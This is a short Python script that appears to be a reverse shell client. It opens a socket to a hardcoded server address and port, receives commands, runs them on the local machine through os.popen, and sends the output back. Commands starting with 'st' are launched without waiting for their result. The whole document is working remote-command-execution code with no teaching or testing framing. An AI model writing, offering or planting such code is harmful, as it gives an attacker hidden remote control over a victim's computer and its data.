import socket, os

host = ("192.168.1.18", 1234) # IP of the server

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	socket.connect(host)
except Exception as err:
	print("Trouble while trying to connect to the server")

while(1):
	try:
		command = str(socket.recv(2048).decode())
		if("".join(list(command)[0:2]) != "st"):
			result = os.popen(command).read()
			if(result == ""):
				result = "Done."
			socket.send(result.encode())
		else:
			os.popen(command)
			socket.send(("".join(list(command)[6:]) + " successfully started.").encode())
	except Exception as err:
		socket.send("Wrong command !".encode())
